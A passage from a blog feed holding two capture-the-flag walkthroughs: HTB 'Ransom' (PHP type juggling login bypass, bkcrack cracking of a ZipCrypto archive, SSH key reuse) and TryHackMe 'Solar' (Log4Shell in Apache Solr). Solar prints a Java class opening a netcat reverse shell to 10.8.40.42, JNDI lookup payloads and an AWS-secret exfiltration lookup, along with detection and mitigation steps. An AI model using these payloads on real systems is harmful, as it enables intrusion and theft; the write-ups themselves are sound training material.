<img src="/assets/images/img-ransom/captura10.png" />
</p>

<p>Before we have seen a port 80 on the scan process, what we can so is using the command <strong><em>whatweb</em></strong> to do a little recognition, to know if the website is using any cms or some particular frameworks. And we can see that the website is using a old version of jquery that can be vulnerable to xss and prototype pollution attack, and we can see that the website is using laravel, that we will have to keeping that in mind these informations for the exploitation phase.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura11.png" />
</p>

<p>And if we access to the website and we can see an authentication panel that asks us to put a password. btw, we can use the wappalyzer extension in our browser, which is the same when we have used the whatweb command.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura12.png" />
</p>

<p>We are going to check with the typical defualt passwords and didn’t work.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura13.png" />
</p>

<p>What we can do is see if the website is vulnerable to sql injections, for this we are going to edit a little bit the html to the website and we are going to modify the password field to be able to see what we are writing.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura14.png" />
</p>

<p>We try a simple sql injection and we can see that is not vulnerable to sql injections.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura15.png" />
</p>

<p>Now what we can do is open burpsuite to intercept the request and manipulate them. Remembe that burpsuite is act like proxy between your browser and the web server.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura16.png" />
</p>

<p>We put any password in the password field and click login on the website to capture the request before sending it to the web server. And we can two cookies and we can see that is using laravel session cookie, another way to to know that the target website is using laravel framework. and on the other side is using cross-site request forgery token (xsrf).</p>

<p align="center">
<img src="/assets/images/img-ransom/captura17.png" />
</p>

<p>We see that it is using and api behind the login form and now because it’s going into this api this xsrf token it’s not to useful. There’s also a second thing that happens in a lot laravel forms that’s if it not going to api it also normally likes passing in <strong><em>&amp;_token</em></strong> parameter which is another xsrf thing, but in this case it not having this parameter and also having api in the url mean’s we’re hitting the api middleware of laravel.</p>

<p>So what we could have done is save this burpsuite request and with sqlmap make several sql injections to check if it is injectable or not, but as we have seen before, the website it’s not vulnerable to sql injections. So if we try to send the request it says “invalid password”.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura18.png" />
</p>

<p>So what we can try is to change the request method to send the same data but in  <strong><em>POST</em></strong>, so in order to do that we right click and click where is says <strong><em>change request method</em></strong>. And when sending the request and it will output the status http code 405, so by post we do not see information that can be useful to us.</p>
<p align="center">
<img src="/assets/images/img-ransom/captura19.png" />
</p>

<p>What we can do is to change POST to GET, but keeping the same format as post. And we can see that it returns the request in json format, and we get the status code 422, and this happen because the <strong><em>content-type</em></strong> it doesn’t in json format.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura20.png" />
</p>

<p>So what we’re going to do is change the content-type in json and put the password field in json format. And we can see the status code is 200 and it’s says “invalid password”, and depending on how the validation of the password field is being applied from the backend at the code level (in this case php) we can exploit vulnerabilities such as type juggling.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura21.png" />
</p>

<p>For example, here we are making a comparison between two inputs, if “jonh” is equal to “jonh” the credentials will be valid, and if it’s not, the credentials will be invalid. Let’s imagine that this is the input field of the password and in the backend side is being compared with a password.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura22.png" />
</p>

<p>So inside the comparison we put a <strong><em>true</em></strong> and because we are in json we can remove the strings (“”) and php will interpreted this as a boolean state. And here is says if “jonh” is equal to the boolean “true”, which is essentially saying if that variable “jonh” is not empty then secceded. But in the case that we put an invalid comparison, it will be false.</p>

<p align="center">
<img src="/assets/images/img-ransom/true.png" />
</p>

<h2 id="exploitation">Exploitation</h2>

<p>Well now back on the burpsuite, in the password field we remove the quotes and we put <strong><em>true</em></strong> and send the request, and as you can see it’s says loggin succed. And with this we already know that the website is vulnerable to type juggling attack and we have already hacked the password field.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura24.png" />
</p>

<p>So if we now go to the <strong><em>intercept</em></strong>, and keep the data format as post and we do the same porcess as we did in the repeater, which is change the <strong><em>content-type</em></strong> to json and change the password field to json format. And if we click in <strong><em>forward</em></strong> we should already have access to the website.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura25.png" />
</p>

<p>And indeed we already have access to the website and can already visualize the first flag.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura26.png" />
</p>

<p>So for example, if we change the value with 0 it’s says “valid credentials” and if we put 1 it’s says “invalid credentials”, because <strong><em>true</em></strong> is 0 and 1 is <strong><em>false</em></strong>. But if we want to mitigate or fix this type of attacks is using tree equals (“===”) to enforce type comparison in php, so if we do three equals it make sure the content is the same and how it’s declaring it’s the same (one thing to metion the “==” is <strong><em>lose comparison</em></strong> and “===” is <strong><em>strict comparison</em></strong>).</p>

<p align="center">
<img src="/assets/images/img-ransom/mitigate.png" />
</p>

<p>So now if i do “jonh” is equal to “jonh” its says “valid credentials” means that is true. So this is a common php logic bug that affects a lot of applications that a lot of developers don’t really test for it, because you have to convert the request to json, so after we will look de source code of that vulnerable website.</p>

<p align="center">
<img src="/assets/images/img-ransom/mitigate2.png" />
</p>

<p>To understand this better, we can see the following table: We see that a string with clear text in quotes is true, so that’s why it gives us a valid password.</p>

<p align="center">
<img src="/assets/images/img-ransom/losstable.png" />
</p>

<p>And with strict comparison this is not happen:</p>

<p align="center">
<img src="/assets/images/img-ransom/strict.png" />
</p>

<p>So before we see a zip file on the website called <strong><em>homedirectory.zip</em></strong>, so if we try to unzip it will require for a password that we don’t know.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura27.png" />
</p>

<p>If we can’t unzip the file, remember that using <strong><em>7z</em></strong> we can view the content of that zip file. So here we can see that this zip file contains some system files for that particular user, and we can see interesting files like <strong><em>id_rsa</em></strong> which is the ssh private key that will allow us to access through shh without providing the password and we can access to the target machine.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura28.png" />
</p>

<p>In this case what we can do is try to crack this zip file using tools like <strong><em>fcrackzip</em></strong>, or in this case i am going to use <strong><em>zip2john</em></strong> and speciffyling the name of the compressed file. And it will dump me the password hash that we can try to crack it using brute force attack with tools like john or hashcat.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura29.png" />
</p>

<p>So, lets save the hash in to a file and then try to crack it with john.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura30.png" />
</p>

<p>And we can see that john is not been able to crack the hash, it has check 14 million lines of the <strong><em>rockyou.txt</em></strong> dictionary and has not found the password.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura31.png" />
</p>

<p>So what we can do now is output more information about the compressed file. So with the utility <strong><em>7z</em></strong> we can use the flag <strong><em>-slt</em></strong> that will allow to output more technical information about the zip file. So we can see that the this compressed file is encryted with the zipcrypto method, so thats why we can’t crack it before. And because it’s encrypted in <strong><em>zipcrypto</em></strong> is vulnerable to a <strong><em>plain text attack</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura32.png" />
</p>

<h2 id="exploitation-2">Exploitation 2</h2>

<p>On the following <a href="https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8">website</a> this guide that we can use, basically in this post the conti malware (conti is ransomware) group had a rouge employee leak a bunch of files and one of them is the source code that was encrypted and they use the zipcrypto library to encrypted. And then someone will managed able to crack it through plain text attack using a tool called <strong><em>bkcrack</em></strong>, that we will going to use now.</p>

<p>So to proceed this attack we need to have a file that we fairly know in plain text how its line can be composed, basically we need to have a file that has more or less similarities of lines to a file that is inside the compressed file that we can carry out this attack, when more similarities there are, the faster the attack will be.</p>

<p>In this case we cannot use the “id_rsa” because we cannot compare it with the id_rsa of the compressed since they are very different. In this case, the file that we can use is the <strong><em>bash_logout</em></strong> to make the comparison since it is a file that usually has the same content in all linux systems.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura33.png" />
</p>

<p>We can see that the size of my bash_logout is the same as the one in the zip file.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura34.png" />
</p>

<p>Let’s install the bkcrack tool, first we need to clone the following <a href="https://github.com/kimci86/bkcrack">repo</a> and then we need to compiled with the following commands.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura35.png" />
</p>

<p>Now if we execute the bkcrack binary with the flag “-h” it will show us the options that we can use.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura36.png" />
</p>

<p>The first thing that we are going to do is locate the file <strong><em>bash_logout</em></strong> in our machine and we’re going to make a copy and move it to the directory where is the bkcrack executable. And then we are goint to zip that file.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura37.png" />
</p>

<p>And as we can see already inside the zip file that we created is our bash_logout.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura38.png" />
</p>

<p>In this case i am also going to move the zip file that is encrypted into the directory where the bkcrack executable is, just for convenience (it’s not necessary to do this process).</p>

<p align="center">
<img src="/assets/images/img-ransom/captura39.png" />
</p>

<p>And now let’s proceed with the attack, we invoke the executable and with the flag <strong><em>-C</em></strong>  we are going to specify the zip file that is encrypted, and with the flag <strong><em>-c</em></strong> we are going the specify the file that we believe that have similarities in this case will be the bash_logout, and then with the flag <strong><em>-P</em></strong> we are going to specify the zip file that we created and then with the flag <strong><em>-p</em></strong> we are going to specify our bash_logout file which is inside our zip file.</p>

<p>And this allow us  is to generate a pair of keys (if it’s works), which will then be used to create a new compressed file that will have the same files as the encrypted file.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura40.png" />
</p>

<p>Once we get the keys, we are going to do the same attack, but now we are going to specify the keys with the flag <strong><em>-k</em></strong>, and then with the flag <strong><em>-U</em></strong> we are going to specify the new zip file which will contain the same files as the encrypted one and we are gonna to specify a password for that zip file. and with this we would have created the new zip files, which in my case is called “test.zip”.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura41.png" />
</p>

<p>And in my case what i am going to do is move that compressed file to another directory, and now if we list the content of that zip file that we just created we can see that it contains the same files that had the encrypted file.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura42.png" />
</p>

<p>Now we are going to unzip this zip file and it will asks us for the password, which in this case would be the one we specified in the bkcrack. And as we can see we already have the files that had the encrypted one.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura43.png" />
</p>

<p>So now we can visualize the id_rsa, and now we can use this private key to access the target machine via ssh.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura44.png" />
</p>

<p>First of all you don’t know with what user we can access via ssh, what we can do is view the <strong><em>authorized_keys</em></strong> to see what usets can access on the target machine, and we can see a user called <strong><em>htb</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura45.png" />
</p>

<p>We are going to apply the permission 600, because if we don’t it will output an error when we try to access for security reasons. And using the id_rsa we already have access to the target machine, and we can see the flag user.txt that we have seen before.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura46.png" />
</p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>We do not have access to the root directory and there are no cron jobs.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura47.png" />
</p>

<p>We are going to check the OS version, and we see that we are in a ubuntu focal machine, which we had previously guessed.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura48.png" />
</p>

<p>What we can do is move where the content of the website is hosted, which is normally on the path <strong><em>/var/www/html</em></strong> and it’s not here. we can check the following path which is <strong><em>/etc/apache2/sites-enabled/</em></strong> and in the default file, we see that he content of the website is hosting in the following path, and we can see the user.txt and the encrypted zip file.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura49.png" />
</p>

<p>And in this case on route <strong><em>/srv/prod</em></strong>, basically i went back one directory since in the other there was nothing interesting. And now if we use the command <strong><em>grep -r “login”</em></strong> to see where the website login authentication is being applied. And we see a route called <strong><em>/route/api</em></strong> that is the same route we have seen in burpsuite.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura50.png" />
</p>

<p>We are going to filter the <strong><em>authcontroller.php</em></strong> file with the find command to see where it is located.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura51.png" />
</p>

<p>And we can see that we were right that the type juggling is being applied, we see the password field is compared with the password <strong><em>UHC-March-Global-PW!</em></strong> and as the name indicates, this password is used for everything. And in the event that they were with three “===” it would not be vulnerable.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura52.png" />
</p>

<p>Let’s check this password in the login form.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura53.png" />
</p>

<p>An as you can see we have access.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura54.png" />
</p>

<p>And with the same password we can access with the root user and visualize the last flag which is <strong><em>root.txt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura55.png" />
</p>

<p>And with this we would already have the machine pwned.</p>

<p align="center">
<img src="/assets/images/img-ransom/captura56.png" />
</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Pentest" /><category term="Hack the box" /><category term="Linux" /><category term="Web" /><category term="PHP" /><category term="Api" /><summary type="html"><![CDATA[Ransom is Linux machine with a medium level defficulty both in exploitain, user own, privilage escalation phase, this involves vulnerabilities such as type juggling that helps us gain access to the web page, and we will also have an encrypted zip file that we must...]]></summary></entry><entry><title type="html">Tryhackme - Solar</title><link href="http://0.0.0.0:4000/tryh-solar/" rel="alternate" type="text/html" title="Tryhackme - Solar" /><published>2022-01-16T00:00:00-05:00</published><updated>2022-01-16T00:00:00-05:00</updated><id>http://0.0.0.0:4000/tryh-solar</id><content type="html" xml:base="http://0.0.0.0:4000/tryh-solar/"><![CDATA[<p>Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.</p>

<p align="center">
<img src="/assets/images/img-solar/portada.png" />
</p>

<p>The first thing we are going to do is to create a file with the machine name, and inside of that file with <strong><em>mkt</em></strong> we are going to create to following directories (the mkt function remember that I have it defined in the <strong><em>~/.zshr</em></strong> to create those directories.).</p>

<p align="center">
<img src="/assets/images/img-solar/captura1.png" />
</p>

<h2 id="recognition">Recognition</h2>

<p>First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128.</p>

<p align="center">
<img src="/assets/images/img-solar/captura2.png" />
</p>

<h2 id="task-2---scanning">Task 2 - Scanning</h2>

<p>I am going to perform a tcp syn scan by adding the min-rate parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sun Jan 16 18:58:46 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.218.103
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.218.103 ()  Status: Up
Host: 10.10.218.103 ()  Ports: 22/open/tcp//ssh///, 111/open/tcp//rpcbind///, 8983/open/tcp/////        Ignored State: closed (65532)
# Nmap done at Sun Jan 16 18:58:59 2022 -- 1 IP address (1 host up) scanned in 13.59 seconds
</code></pre></div></div>

<p>Basically i save it in the grepable format is that i have a function defined in the ~/.zshrc called <strong><em>extractports</em></strong> that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.</p>

<p align="center">
<img src="/assets/images/img-solar/captura3.png" />
</p>

<p>Extractports script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">function </span>extractPorts<span class="o">(){</span>
        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
        <span class="nb">cat </span>extractPorts.tmp<span class="p">;</span> <span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<p>And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Sun Jan 16 19:00:30 2022 as: nmap -sCV -p22,111,8983 -oN targeted 10.10.218.103
Nmap scan report for 10.10.218.103
Host is up (0.066s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://10.10.218.103:8983/solr/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 19:00:45 2022 -- 1 IP address (1 host up) scanned in 14.66 seconds
</code></pre></div></div>
<p>As there is a http service on port 8983 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc.</p>

<p align="center">
<img src="/assets/images/img-solar/captura4.png" />
</p>

<p>If we access with the ip address on the port 8983 we will be in the apache solr admin page as you can see. So if you asking what is apache solr? it’s an open source search platform that has written in java from apache lucene project library, basically is used to optimezed a search quries and search indexes for large amounts of data and it’s used for many apps or websites that require a search engine for a lot of content and part of this functionality involves the use of cores,  once of examples can be the eccommerce websites.</p>

<p align="center">
<img src="/assets/images/img-solar/captura5.png" />
</p>

<h2 id="task-3---discovery">Task 3 - Discovery</h2>

<p>Basically what it is telling us is that the version apache solr 8.11.0 has log4j vulnerabilities, basically apache solr to store logs uses the log4j. And it is indicaticating us that this machine the apache solr has the minimum installation and configuration but that it does influence much since it is to give us to understand the attack.</p>

<p align="center">
<img src="/assets/images/img-solar/captura7.png" />
</p>

<p>If we go back in the website we can see where tha path where the logs are stored in solr.</p>

<p align="center">
<img src="/assets/images/img-solar/captura6.png" />
</p>

<p>In the task it’s tells us to install a file that contain solr logs to get an idea of what they look like. So let’s unzip that zip file.</p>

<p align="center">
<img src="/assets/images/img-solar/captura8.png" />
</p>

<p>If we open one of the files we can see how the logs are stored in solr, but something interesting is that an <strong><em>INFO</em></strong> entry that is shown repeatedly which is the <strong><em>admin/cores</em></strong> url endpoint.</p>

<p align="center">
<img src="/assets/images/img-solar/captura9.png" />
</p>

<p>Looking at these log entries we can see that in the <strong><em>parms</em></strong> field there are no info is shown, so thats mean that we could modify or add values in that specific parameter that will serve us to exploit the log4j.</p>

<p align="center">
<img src="/assets/images/img-solar/captura10.png" />
</p>

<h2 id="task-4---proof-of-concept">Task 4 - Proof of Concept</h2>

<p>Well is tells us one of the pontential routes that we can exploit the log4j in this particular version of solr that we will be access in moment and we have alreadyseen one of the attack vector (<strong><em>perms</em></strong>). And in the documentation it show us some examples of how to perform lookups with the following syntaxes in log4j, which first would be add the prefix and then would be the name or code to be executed, and we can see that among them we can perform lookups for env variables and about the system.</p>

<p>And it is show us to how abuse this, that first it would be to invoke the jndi plugin and then we indicate that it connects is our attacker ldap server: <strong><em>${jndi:ldap://ATTACKERIP:1389/PORT}</em></strong></p>

<p>So in the documentation it’s says that the log4j vuln will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface”. First of all is a directory service that allows any java software to find data through a directory using a name service, basically it’s objective is to obtain data from other system or servers very easily and even to obtain java objects remotely (which where the problem comes from), jdni allow us to use variety directory service like ldap, rmi and more. So in this case with log4j we can utilize jndi lookups in conjunction with ldap to obtain an external resource that’s being stored on any server. So some version of apache come with a pre-package with the jndi lookup plugin which is vuln. more info <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell">here</a></p>

<p>Now as attackers can use the jndi plugin with a malicious ldap referral server to share a malicious java class or payload.</p>

<p align="center">
<img src="/assets/images/img-solar/captura11.png" />
</p>

<p>Here it tells us that this syntax can be injected into any entry in which the logs are being registred (forms, http addresses, etc).</p>

<p align="center">
<img src="/assets/images/img-solar/captura12.png" />
</p>

<p>So in this particular version of apache solr there is an api endpoint url which is the <strong><em>solr/Admin/cores</em></strong> route we can inject the jndi lookup plugin, somethinglike this: <strong><em>http://MACHINE_IP:8983/solr/admin/cores?cmd=${jndi:ldap://IP:1389/}</em></strong></p>

<p align="center">
<img src="/assets/images/img-solar/captura14.png" />
</p>

<p>Ok so to know if the website is vulnerable to logj4 and if it’s using log4j we need to use the following commands:</p>

<p align="center">
<img src="/assets/images/img-solar/captura13.png" />
</p>

<p>So first we need to listen with netcat to receive connection, and in a another window with the curl command we are going to inject the jndi lookup specifying our attacker ip address and the port that we are listening in netcat (which in my case it’s the port 9999), and if we are receive a connection it’s mean that the website is using the log4j and it’s vulnerable. And with this we would resolve the POC.</p>

<p align="center">
<img src="/assets/images/img-solar/captura15.png" />
</p>

<h2 id="task-5---exploitation">Task 5 - Exploitation</h2>

<p>In this case it tells us in the documentation how to exploit the logj to get a reverse shell, first we need to listen with netcat to receive the connection as we done in the POC, then it tells as that we need to execute a ldap refferal server and with python or php host the payload that we want to execute on the victim machine.</p>

<p align="center">
<img src="/assets/images/img-solar/captura16.png" />
</p>

<p>So we need to clone this <a href="https://github.com/mbechler/marshalsec">repo</a> to execute in our attacker machine the ldap referral server. In the README file of this repo it tells us that we must to hace <strong><em>java 8</em></strong> to be able to run our ldap server, in the case if we don’t have java 8 installed on our attacker machine we must be follow the following installation steps shown in the documentation.</p>

<p align="center">
<img src="/assets/images/img-solar/captura21.png" />
</p>

<p>Now with maven what we are going to do is to compile all the dependencies from the marshalsec repo that will be inside a folder called <strong><em>target</em></strong> that will contain the <strong><em>.jar</em></strong> file. If you dont have maven installed on your machine use the cammand: <strong><em>apt install maven</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-solar/captura22.png" />
</p>

<p>Now we ara going to run our ldap referral server to direct connections to our secondary http server that will be host the java payload.</p>

<p align="center">
<img src="/assets/images/img-solar/captura23.png" />
</p>

<p>Now let’s use this java payload to get a reverse shell with netcat specifying our ip address and the port that we are going listen to.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"nc -e /bin/bash 10.8.40.42 9999"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Then we are need to compile this java payload into a java class with the following command.</p>

<p align="center">
<img src="/assets/images/img-solar/captura25.png" />
</p>

<p>With python we are going to host this java class payload to download or transfer in the victim machine.</p>

<p align="center">
<img src="/assets/images/img-solar/captura26.png" />
</p>

<p>Now in another window we going to execute with curl the same command that we executed in the POC but this time we will put the name of the payload that we are hosting in python (btw you can use the http request in the browser if you want, but i recommend with curl). and as you can see that in the http server in python we have received a GET request and in netcat we already have access to the machine. And now that how we are exploit the logj vulnerabilities.</p>

<p align="center">
<img src="/assets/images/img-solar/captura27.png" />
</p>

<p>If you have any problems to execute the reverse shell, here are some possible solutions.</p>

<p align="center">
<img src="/assets/images/img-solar/captura28.png" />
</p>

<h2 id="task-6---persistence">Task 6 - Persistence</h2>

<p>once we have access we are going to spawn a proper console with python (or you can use the command: <strong><em>script /dev/null -c bash)</em></strong> and then do the tty treatment as indicated in the documentation to move better through the console.</p>

<p align="center">
<img src="/assets/images/img-solar/captura29.png" />
</p>

<p>Now we are going to export two env variables, which is <strong><em>xterm</em></strong> to get a appropriate shell to use commands like <strong><em>clear</em></strong> and <strong><em>bash</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-solar/captura31.png" />
</p>

<p>If we use the command <strong><em>cat /etc/passwd</em></strong> we can see all the users that exist in the system.</p>

<p align="center">
<img src="/assets/images/img-solar/captura32.png" />
</p>

<p>With the command <strong><em>sudo -l</em></strong> let’s check if we have sudo permissions, and as you can see it’s indicate <strong><em>NOPASSWS</em></strong> thats mean that we can run all sudo commands without the user password.</p>

<p align="center">
<img src="/assets/images/img-solar/captura33.png" />
</p>

<p>And since we don’t the password, what we can do is to change the user password on the system since we have permissions to execute sudo commands without the password, with the command <strong><em>passwd</em></strong> we will add a new password.</p>

<p align="center">
<img src="/assets/images/img-solar/captura34.png" />
</p>

<p>And once we change the password we can connect with ssh to the victim machine.</p>

<p align="center">
<img src="/assets/images/img-solar/captura35.png" />
</p>

<h2 id="task-7---detection">Task 7 - Detection</h2>

<p>And here it tells us the tools that we can use to detect if our java app has this vulnerability, among them detecting log4j packages that are vulnerable or detecting culnerable JAR files.</p>

<p align="center">
<img src="/assets/images/img-solar/captura36.png" />
</p>

<p>Here we can see the directory where the apache solr logs are stored.</p>

<p align="center">
<img src="/assets/images/img-solar/captura37.png" />
</p>

<p>In this case if we access one of these files, which in this case in the <strong><em>solr.log</em></strong> file  we can see that inside the perms field the jndi lookup has ben injected which is connect our ldap referral server and execute the malicious payload, and this would be a wey to detect this vulnerability in the log files.</p>

<p align="center">
<img src="/assets/images/img-solar/captura38.png" />
</p>

<h2 id="task-8---bypasses">Task 8 - Bypasses</h2>

<p>And here it show us the possibles bypasses that it can be use if we are attacker, Among them we can extract env variables that can contain some type of access key, for example the <strong><em>${env:AWS_SECRET_ACCESS_KEY}</em></strong> which is very very critical. btw it’s not necessary to run a ldap referral server we can use rmi protocol to search for external resources or to inject jndi lookups.</p>

<p align="center">
<img src="/assets/images/img-solar/captura39.png" />
</p>

<p>So we can use the command <strong><em>printenv</em></strong> to use the env variables in the system, and se if there have a exfiltration.</p>

<p align="center">
<img src="/assets/images/img-solar/captura40.png" />  
</p>

<h2 id="task-9---mitigation">Task 9 - Mitigation</h2>

<p>In the case of apache solr we can perform this mitigation to aviod this type of attack.</p>

<p align="center">
<img src="/assets/images/img-solar/captura43.png" />
</p>

<p>First we are gon a locate the file <strong><em>solr.in.sh</em></strong> which is contain the apache solr env variables.</p>

<p align="center">
<img src="/assets/images/img-solar/captura45.png" />
</p>

<p>So once we have located it the file we open it with your favorite bash editor, and we are gon a paste this sentence <strong><em>SOLR_OPTS=”$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true”</em></strong> that we can’t perform external lookups with jndi. Then save the file.</p>

<p align="center">
<img src="/assets/images/img-solar/captura46.png" />
</p>

<p>And now restart the apache solr service to apply the changes that we make.</p>

<p align="center">
<img src="/assets/images/img-solar/captura47.png" />
</p>

<p>And now if we perform the same attack again to access in the system, we see that we do not have any connection from the victim machine. because now it’s disable the jndi lookups which means the victima machine can’t connect our ldap referral server.</p>

<p align="center">
<img src="/assets/images/img-solar/captura48.png" />
</p>

<h2 id="task-10---patching">Task 10 - Patching</h2>

<p>And finally, it tells us that there are still no patches for this vulnerability (log4shell) and it’s recommended to update the log4j packages to the new version that it’s not include the jndi.</p>

<p align="center">
<img src="/assets/images/img-solar/captura49.png" />
</p>

<p>And with this we finish the room, and we already know how this vulnerability works and how critical it is.</p>

<p align="center">
<img src="/assets/images/img-solar/captura50.png" />
